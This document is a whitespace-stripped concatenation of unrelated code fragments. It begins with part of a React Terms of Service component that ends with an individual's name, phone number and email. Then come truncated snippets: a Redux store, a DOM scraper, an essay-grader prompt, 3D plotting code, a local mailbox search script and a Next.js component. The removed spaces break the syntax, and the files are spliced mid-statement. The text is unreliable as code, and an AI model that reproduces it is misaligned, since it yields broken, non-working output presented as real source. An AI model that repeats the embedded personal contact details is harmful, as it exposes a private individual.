rmal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}>Ifforanyreason,aDisputeproceedsincourtratherthanarbitration,theDisputeshallbecommencedorprosecutedinthe</span><bdtclassName='block-component'style={{fontSize:15}}/><spanstyle={{fontSize:15}}>&nbsp;stateandfederalcourts</span><bdtclassName='statement-end-if-in-editor'style={{fontSize:15}}/><spanstyle={{fontSize:15}}>&nbsp;locatedin</span><bdtclassName='block-component'style={{fontSize:15}}/>{''}<bdtclassName='question'>SanDiego</bdt><spanstyle={{fontSize:15}}>,</span><bdtclassName='statement-end-if-in-editor'style={{fontSize:15}}/>{''}<bdtclassName='block-component'style={{fontSize:15}}/><bdtclassName='question'style={{fontSize:15}}>California</bdt><bdtclassName='statement-end-if-in-editor'style={{fontSize:15}}/><spanstyle={{fontSize:15}}>,andthePartiesherebyconsentto,andwaiveall<bdtclassName='block-component'/>defenses<bdtclassName='statement-end-if-in-editor'/>oflackofpersonaljurisdiction,andforumnonconvenienswithrespecttovenueandjurisdictioninsuch<bdtclassName='block-component'/>stateandfederalcourts<bdtclassName='statement-end-if-in-editor'/>.ApplicationoftheUnitedNationsConventiononContractsfortheInternationalSaleofGoodsandtheUniformComputerInformationTransactionAct(UCITA)areexcludedfromtheseLegalTerms.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><bdtclassName='block-component'/>InnoeventshallanyDisputebroughtbyeitherPartyrelatedinanywaytotheServicesbecommencedmorethan<bdtclassName='question'>one(1)</bdt>yearsafterthecauseofactionarose.<bdtclassName='statement-end-if-in-editor'/>Ifthisprovisionisfoundtobeillegalorunenforceable,thenneitherPartywillelecttoarbitrateanyDisputefallingwithinthatportionofthisprovisionfoundtobeillegalorunenforceableandsuchDisputeshallbedecidedbyacourtofcompetentjurisdictionwithinthecourtslistedforjurisdictionabove,andthePartiesagreetosubmittothepersonaljurisdictionofthatcourt.<bdtclassName='block-component'/></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_2'style={{lineHeight:'1.5',textAlign:'left'}}><strong>Restrictions</strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}>ThePartiesagreethatanyarbitrationshallbelimitedtotheDisputebetweenthePartiesindividually.Tothefullextentpermittedbylaw,(a)noarbitrationshallbejoinedwithanyotherproceeding;(b)thereisnorightorauthorityforanyDisputetobearbitratedonaclass-actionbasisorto<bdtclassName='block-component'/>utilize<bdtclassName='statement-end-if-in-editor'/>classactionprocedures;and(c)thereisnorightorauthorityforanyDisputetobebroughtinapurportedrepresentativecapacityonbehalfofthegeneralpublicoranyotherpersons.</div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_2'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='block-component'/><strong>ExceptionstoInformalNegotiationsandArbitration</strong><bdtclassName='statement-end-if-in-editor'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='block-component'/>ThePartiesagreethatthefollowingDisputesarenotsubjecttotheaboveprovisionsconcerninginformalnegotiationsbindingarbitration:(a)anyDisputesseekingtoenforceorprotect,orconcerningthevalidityof,anyoftheintellectualpropertyrightsofaParty;(b)anyDisputerelatedto,orarisingfrom,allegationsoftheft,piracy,invasionofprivacy,or<bdtclassName='block-component'/>unauthorized<bdtclassName='statement-end-if-in-editor'/>use;and(c)anyclaimforinjunctiverelief.Ifthisprovisionisfoundtobeillegalorunenforceable,thenneitherPartywillelecttoarbitrateanyDisputefallingwithinthatportionofthisprovisionfoundtobeillegalorunenforceableandsuchDisputeshallbedecidedbyacourtofcompetentjurisdictionwithinthecourtslistedforjurisdictionabove,andthePartiesagreetosubmittothepersonaljurisdictionofthatcourt.<bdtclassName='statement-end-if-in-editor'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='statement-end-if-in-editor'><bdtclassName='statement-end-if-in-editor'/></bdt></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='corrections'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>15.</span></strong></span></strong></span>&nbsp;</strong>CORRECTIONS</span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}>TheremaybeinformationontheServicesthatcontainstypographicalerrors,inaccuracies,oromissions,includingdescriptions,pricing,availability,andvariousotherinformation.Wereservetherighttocorrectanyerrors,inaccuracies,oromissionsandtochangeorupdatetheinformationontheServicesatanytime,withoutpriornotice.</div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='disclaimer'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:19,color:'rgb(0,0,0)'}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>16.</span></strong></span></strong></span>{''}DISCLAIMER</strong></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>THESERVICESAREPROVIDEDONANAS-ISANDAS-AVAILABLEBASIS.YOUAGREETHATYOURUSEOFTHESERVICESWILLBEATYOURSOLERISK.TOTHEFULLESTEXTENTPERMITTEDBYLAW,WEDISCLAIMALLWARRANTIES,EXPRESSORIMPLIED,INCONNECTIONWITHTHESERVICESANDYOURUSETHEREOF,INCLUDING,WITHOUTLIMITATION,THEIMPLIEDWARRANTIESOFMERCHANTABILITY,FITNESSFORAPARTICULARPURPOSE,ANDNON-INFRINGEMENT.WEMAKENOWARRANTIESORREPRESENTATIONSABOUTTHEACCURACYORCOMPLETENESSOFTHESERVICES&apos;CONTENTORTHECONTENTOFANYWEBSITESORMOBILEAPPLICATIONSLINKEDTOTHESERVICESANDWEWILLASSUMENOLIABILITYORRESPONSIBILITYFORANY(1)ERRORS,MISTAKES,ORINACCURACIESOFCONTENTANDMATERIALS,(2)PERSONALINJURYORPROPERTYDAMAGE,OFANYNATUREWHATSOEVER,RESULTINGFROMYOURACCESSTOANDUSEOFTHESERVICES,(3)ANY{''}<bdtclassName='block-component'/>UNAUTHORIZED<bdtclassName='statement-end-if-in-editor'/>ACCESSTOORUSEOFOURSECURESERVERSAND/ORANYANDALLPERSONALINFORMATIONAND/ORFINANCIALINFORMATIONSTOREDTHEREIN,(4)ANYINTERRUPTIONORCESSATIONOFTRANSMISSIONTOORFROMTHESERVICES,(5)ANYBUGS,VIRUSES,TROJANHORSES,ORTHELIKEWHICHMAYBETRANSMITTEDTOORTHROUGHTHESERVICESBYANYTHIRDPARTY,AND/OR(6)ANYERRORSOROMISSIONSINANYCONTENTANDMATERIALSORFORANYLOSSORDAMAGEOFANYKINDINCURREDASARESULTOFTHEUSEOFANYCONTENTPOSTED,TRANSMITTED,OROTHERWISEMADEAVAILABLEVIATHESERVICES.WEDONOTWARRANT,ENDORSE,GUARANTEE,ORASSUMERESPONSIBILITYFORANYPRODUCTORSERVICEADVERTISEDOROFFEREDBYATHIRDPARTYTHROUGHTHESERVICES,ANYHYPERLINKEDWEBSITE,ORANYWEBSITEORMOBILEAPPLICATIONFEATUREDINANYBANNEROROTHERADVERTISING,ANDWEWILLNOTBEAPARTYTOORINANYWAYBERESPONSIBLEFORMONITORINGANYTRANSACTIONBETWEENYOUANDANYTHIRD-PARTYPROVIDERSOFPRODUCTSORSERVICES.ASWITHTHEPURCHASEOFAPRODUCTORSERVICETHROUGHANYMEDIUMORINANYENVIRONMENT,YOUSHOULDUSEYOURBEST{''}<bdtclassName='block-component'/>JUDGMENT<bdtclassName='statement-end-if-in-editor'/>ANDEXERCISECAUTIONWHEREAPPROPRIATE.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='liability'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>17.</span></strong></span></strong></span>&nbsp;</strong>LIMITATIONSOFLIABILITY</span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}><spandata-custom-class='body_text'>INNOEVENTWILLWEOROURDIRECTORS,EMPLOYEES,ORAGENTSBELIABLETOYOUORANYTHIRDPARTYFORANYDIRECT,INDIRECT,CONSEQUENTIAL,EXEMPLARY,INCIDENTAL,SPECIAL,ORPUNITIVEDAMAGES,INCLUDINGLOSTPROFIT,LOSTREVENUE,LOSSOFDATA,OROTHERDAMAGESARISINGFROMYOURUSEOFTHESERVICES,EVENIFWEHAVEBEENADVISEDOFTHEPOSSIBILITYOFSUCHDAMAGES.</span>{''}<bdtclassName='block-containerif'data-type='if'id='3c3071ce-c603-4812-b8ca-ac40b91b9943'><spandata-custom-class='body_text'><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='limitations_liability_option'data-type='statement'/><bdtdata-type='body'>NOTWITHSTANDINGANYTHINGTOTHECONTRARYCONTAINEDHEREIN,OURLIABILITYTOYOUFORANYCAUSEWHATSOEVERANDREGARDLESSOFTHEFORMOFTHEACTION,WILLATALLTIMESBELIMITEDTO{''}<bdtclassName='block-containerif'data-type='if'id='73189d93-ed3a-d597-3efc-15956fa8e04e'><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='limitations_liability_option'data-type='statement'/><bdtdata-type='body'>THEAMOUNTPAID,IFANY,BYYOUTOUS<bdtclassName='block-containerif'data-type='if'id='19e172cb-4ccf-1904-7c06-4251800ba748'><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='limilation_liability_time_option'data-type='statement'/></bdt></bdt></bdt><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='limitations_liability_option'data-type='statement'>.</bdt></bdt></bdt></bdt></bdt></bdt></span></bdt>&nbsp;</span><spandata-custom-class='body_text'>CERTAINUSSTATELAWSANDINTERNATIONALLAWSDONOTALLOWLIMITATIONSONIMPLIEDWARRANTIESORTHEEXCLUSIONORLIMITATIONOFCERTAINDAMAGES.IFTHESELAWSAPPLYTOYOU,SOMEORALLOFTHEABOVEDISCLAIMERSORLIMITATIONSMAYNOTAPPLYTOYOU,ANDYOUMAYHAVEADDITIONALRIGHTS.</span><bdtclassName='statement-end-if-in-editor'data-type='close'><spandata-custom-class='body_text'/></bdt></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='indemnification'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>18.</span></strong></span></strong></span>&nbsp;</strong>INDEMNIFICATION</span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>Youagreetodefend,indemnify,andholdusharmless,includingoursubsidiaries,affiliates,andallofourrespectiveofficers,agents,partners,andemployees,fromandagainstanyloss,damage,liability,claim,ordemand,includingreasonableattorneys’feesandexpenses,madebyanythirdpartyduetoorarisingoutof:{''}<bdtclassName='block-containerif'data-type='if'id='475fffa5-05ca-def8-ac88-f426b238903c'><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='user_post_content_option'data-type='statement'/></bdt>(<spanstyle={{fontSize:'14.6667px'}}>1</span>)useoftheServices;(<spanstyle={{fontSize:'14.6667px'}}>2</span>)breachoftheseLegalTerms;(<spanstyle={{fontSize:'14.6667px'}}>3</span>)anybreachofyourrepresentationsandwarrantiessetforthintheseLegalTerms;(<spanstyle={{fontSize:'14.6667px'}}>4</span>)yourviolationoftherightsofathirdparty,includingbutnotlimitedtointellectualpropertyrights;or(<spanstyle={{fontSize:'14.6667px'}}>5</span>)anyovertharmfulacttowardanyotheruseroftheServiceswithwhomyouconnectedviatheServices.Notwithstandingtheforegoing,wereservetheright,atyourexpense,toassumetheexclusive{''}<bdtclassName='block-component'/>defense<bdtclassName='statement-end-if-in-editor'/>andcontrolofanymatterforwhichyouarerequiredtoindemnifyus,andyouagreetocooperate,atyourexpense,withour{''}<bdtclassName='block-component'/>defense<bdtclassName='statement-end-if-in-editor'/>ofsuchclaims.Wewillusereasonableeffortstonotifyyouofanysuchclaim,action,orproceedingwhichissubjecttothisindemnificationuponbecomingawareofit.</bdt></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='userdata'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>19.</span></strong></span></strong></span>&nbsp;</strong>USERDATA</span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>WewillmaintaincertaindatathatyoutransmittotheServicesforthepurposeofmanagingtheperformanceoftheServices,aswellasdatarelatingtoyouruseoftheServices.Althoughweperformregularroutinebackupsofdata,youaresolelyresponsibleforalldatathatyoutransmitorthatrelatestoanyactivityyouhaveundertakenusingtheServices.Youagreethatweshallhavenoliabilitytoyouforanylossorcorruptionofanysuchdata,andyouherebywaiveanyrightofactionagainstusarisingfromanysuchlossorcorruptionofsuchdata.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='electronic'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>20.</span></strong></span></strong></span>&nbsp;</strong>ELECTRONICCOMMUNICATIONS,TRANSACTIONS,ANDSIGNATURES</span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>VisitingtheServices,sendingusemails,andcompletingonlineformsconstituteelectroniccommunications.Youconsenttoreceiveelectroniccommunications,andyouagreethatallagreements,notices,disclosures,andothercommunicationsweprovidetoyouelectronically,viaemailandontheServices,satisfyanylegalrequirementthatsuchcommunicationbeinwriting.YOUHEREBYAGREETOTHEUSEOFELECTRONICSIGNATURES,CONTRACTS,ORDERS,ANDOTHERRECORDS,ANDTOELECTRONICDELIVERYOFNOTICES,POLICIES,ANDRECORDSOFTRANSACTIONSINITIATEDORCOMPLETEDBYUSORVIATHESERVICES.Youherebywaiveanyrightsorrequirementsunderanystatutes,regulations,rules,ordinances,orotherlawsinanyjurisdictionwhichrequireanoriginalsignatureordeliveryorretentionofnon-electronicrecords,ortopaymentsorthegrantingofcreditsbyanymeansotherthanelectronicmeans.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='california'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>21.</span></strong></span></strong></span>&nbsp;</strong>CALIFORNIAUSERSANDRESIDENTS</span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>Ifanycomplaintwithusisnotsatisfactorilyresolved,youcancontacttheComplaintAssistanceUnitoftheDivisionofConsumerServicesoftheCaliforniaDepartmentofConsumerAffairsinwritingat1625NorthMarketBlvd.,SuiteN112,Sacramento,California95834orbytelephoneat(800)952-5210or(916)445-1254.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='statement-end-if-in-editor'/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='misc'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>22.</span></strong></span>&nbsp;</strong>&nbsp;</span>&nbsp;</strong>MISCELLANEOUS</span>&nbsp;</strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>TheseLegalTermsandanypoliciesoroperatingrulespostedbyusontheServicesorinrespecttotheServicesconstitutetheentireagreementandunderstandingbetweenyouandus.OurfailuretoexerciseorenforceanyrightorprovisionoftheseLegalTermsshallnotoperateasawaiverofsuchrightorprovision.TheseLegalTermsoperatetothefullestextentpermissiblebylaw.Wemayassignanyorallofourrightsandobligationstoothersatanytime.Weshallnotberesponsibleorliableforanyloss,damage,delay,orfailuretoactcausedbyanycausebeyondourreasonablecontrol.IfanyprovisionorpartofaprovisionoftheseLegalTermsisdeterminedtobeunlawful,void,orunenforceable,thatprovisionorpartoftheprovisionisdeemedseverablefromtheseLegalTermsanddoesnotaffectthevalidityandenforceabilityofanyremainingprovisions.Thereisnojointventure,partnership,employmentoragencyrelationshipcreatedbetweenyouandusasaresultoftheseLegalTermsoruseoftheServices.YouagreethattheseLegalTermswillnotbeconstruedagainstusbyvirtueofhavingdraftedthem.Youherebywaiveanyandall<bdtclassName='block-component'/>defenses<bdtclassName='statement-end-if-in-editor'/>youmayhavebasedontheelectronicformoftheseLegalTermsandthelackofsigningbythepartiesheretotoexecutetheseLegalTerms.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='contact'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial'}}><spanstyle={{fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>23.</span></strong></span>&nbsp;</strong></span></strong>CONTACTUS</span></span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>InordertoresolveacomplaintregardingtheServicesortoreceivefurtherinformationregardinguseoftheServices,pleasecontactusat:</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(89,89,89)'}}><bdtclassName='question'><strong>NathanDai</strong></bdt><strong><bdtclassName='block-component'/></strong></span><strong><bdtclassName='block-component'/></strong></span></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{fontSize:15}}><strong><spanstyle={{color:'rgb(89,89,89)'}}><bdtclassName='question'>(760)-717-2199</bdt><bdtclassName='block-component'/><bdtclassName='block-component'/></span></strong><strong><spanstyle={{color:'rgb(89,89,89)'}}><bdtclassName='block-component'/></span></strong></span></strong></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><strong><strong><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}><strong><bdtclassName='block-component'/></strong></span></strong></strong></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><strong><strong><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}><strong><bdtclassName='block-component'/></strong></span></strong></strong></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}><strong><bdtclassName='question'>nathandai2000@gmail.com</bdt></strong></span></strong></div></div><styledangerouslySetInnerHTML={{__html:'\nul{\nlist-style-type:square;\n}\nul>li>ul{\nlist-style-type:circle;\n}\nul>li>ul>li>ul{\nlist-style-type:square;\n}\nolli{\nfont-family:Arial;\n}\n',}}/><br/><br/><br/></div>);};exportdefaultTerms;importaxiosfrom'axios';import*ascheeriofrom'cheerio';constasyncscrapeGymTimesimport{configureStore}from'@reduxjs/toolkit';import{apiSlice}from'./api/apiSlice';exportconststore=configureStore({reducer:{[apiSlice.reducerPath]:apiSlice.reducer,},middleware:(getDefaultMiddleware)=>{returngetDefaultMiddleware().concat(apiSlice.middleware);},devTools:true,});consta=document.querySelector("#router-root>div:nth-child(1)>div>div>div:nth-child(3)>div:nth-child(1)").childrenconstb=[];for(leti=0;i<a.length;i++){constelement=a[i];b.push(element.children[0].children[0].children[2].children[0].children[0].children[1].children[1].children[0].children[0].innerText);}st.title('AutomatedEssayGrader')#headers={#"Content-Type":"application/json",#"Authorization":f"Bearer{key}"#}#gpt_prompt='Listideasyouwouldincludeinanessaythatwouldrespondtothisprompt:"'+st.text_input("Prompt",max_chars=64*3)+'"'#assertlen(gpt_prompt)<64*4,'GPTpromptmustbelessthan64tokens'#parameters={#'prompt':gpt_prompt,#'max_tokens':256,#'temperature':0.9,#'top_p':1,#'n':1,#}importosimportmatplotlib.pyplotaspltimportnumpyasnpdefgenerate_dynamic_cycle_xy_values(length=21,init_elev=0,num_components=84,frequency_range=(1,5),amplitude_range=(0.5,10),step_range=(0,2),):#Yvaluesgenerationy_sequence=np.ones(length)*init_elevfor_inrange(num_components):#Chooseafrequencythatwillcompletewholecyclesinthesequencefrequency=np.random.randint(*frequency_range)*(2*np.pi/length)amplitude=np.random.uniform(*amplitude_range)phase_shift=np.random.choice([0,np.pi])#np.random.uniform(0,2*np.pi)angles=(np.linspace(0,frequency*length,length,endpoint=False)+phase_shift)y_sequence+=np.sin(angles)*amplitude#Xvaluesgeneration#Generatelength-1stepssincethelaststepisbacktostartsteps=np.random.uniform(*step_range,length-1)total_step_sum=np.sum(steps)#Calculatethescalefactortoscaletotalstepstojustunder360scale_factor=(360-((360/length)*np.random.uniform(*step_range)))/total_step_sum#ApplythescalefactorandgeneratethesequenceofXvaluesx_values=np.cumsum(steps*scale_factor)#Ensurethesequencestartsat0andaddthefinalsteptocompletetheloopx_values=np.insert(x_values,0,0)returnx_values,y_sequencedefsmooth_data(data,window_size):#Extenddataatbothendsbywrappingaroundtocreateacontinuouslooppad_size=window_sizepadded_data=np.concatenate((data[-pad_size:],data,data[:pad_size]))#Applysmoothingkernel=np.ones(window_size)/window_sizesmoothed_data=np.convolve(padded_data,kernel,mode="same")#Extractthesmootheddatacorrespondingtotheoriginalsequence#Adjusttheindicestoaccountforthelargerpaddingstart_index=pad_sizeend_index=-pad_sizeifpad_size!=0elseNonesmoothed_original_data=smoothed_data[start_index:end_index]returnsmoothed_original_data#Functiontogenerateandprocessthedatadefgen_dynamic_loop(length=21,elev_deg=0):whileTrue:#GeneratethecombinedXandYvaluesusingthenewfunctionazim_values,elev_values=generate_dynamic_cycle_xy_values(length=84,init_elev=elev_deg)#SmooththeYvaluesdirectlysmoothed_elev_values=smooth_data(elev_values,5)max_magnitude=np.max(np.abs(smoothed_elev_values))ifmax_magnitude<90:breaksubsample=84//lengthazim_rad=np.deg2rad(azim_values[::subsample])elev_rad=np.deg2rad(smoothed_elev_values[::subsample])#Makecondframethelastonereturnnp.roll(azim_rad,-1),np.roll(elev_rad,-1)defplot_3D(azim,polar,save_path,dynamic=True):os.makedirs(os.path.dirname(save_path),exist_ok=True)elev=np.deg2rad(90)-polarfig=plt.figure(figsize=(5,5))ax=fig.add_subplot(projection="3d")cm=plt.get_cmap("Greys")col_line=[cm(i)foriinnp.linspace(0.3,1,len(azim)+1)]cm=plt.get_cmap("cool")col=[cm(float(i)/(len(azim)))foriinnp.arange(len(azim))]xs=np.cos(elev)*np.cos(azim)ys=np.cos(elev)*np.sin(azim)zs=np.sin(elev)ax.scatter(xs[0],ys[0],zs[0],s=100,color=col[0])xs_d,ys_d,zs_d=(xs[1:]-xs[:-1]),(ys[1:]-ys[:-1]),(zs[1:]-zs[:-1])foriinrange(len(xs)-1):ifdynamic:ax.quiver(xs[i],ys[i],zs[i],xs_d[i],ys_d[i],zs_d[i],lw=2,color=col_line[i])else:ax.plot(xs[i:i+2],ys[i:i+2],zs[i:i+2],lw=2,c=col_line[i])ax.scatter(xs[i+1],ys[i+1],zs[i+1],s=100,color=col[i+1])ax.scatter(xs[:1],ys[:1],zs[:1],s=120,facecolors="none",edgecolors="k")ax.scatter(xs[-1:],ys[-1:],zs[-1:],s=120,facecolors="none",edgecolors="k")ax.view_init(elev=30,azim=-20,roll=0)plt.savefig(save_path,bbox_inches="tight")plt.clf()plt.close()importmailboximportsyssys.stdout=open('output.txt','w')mbox=mailbox.mbox(r'F:\Nathan\Email\2-20-23.mbox')query='alex'formessageinmbox:parts=message.get_payload()forpartinparts:try:if(isinstance(parts,list)):body=part.get_payload()[0]ifisinstance(part.get_payload(),list)elsepart.get_payload()if(queryinbody.lower()or(message['sender']isnotNoneandqueryinmessage['sender'])):print(message['sender'])print(message['Date'])print(body)print()else:body=part.get_payload()[0]ifisinstance(part.get_payload(),list)elsepart.get_payload()if(queryinbody.lower()or(message['sender']isnotNoneandqueryinmessage['sender'])):print(message['sender'])print(message['Date'])print(body)print()except:passimportImagefrom'next/image';constSubtitle=({profilePicture,name,major,graduationYear})=>{return(<divclassName='flexflex-colitems-centermb-6'><Imagesrc={profilePicture}alt='Profile'width={200}height={200}className='rounded-full'/><divclassName='mt-4text-left'><spanclassName='text-xlfont-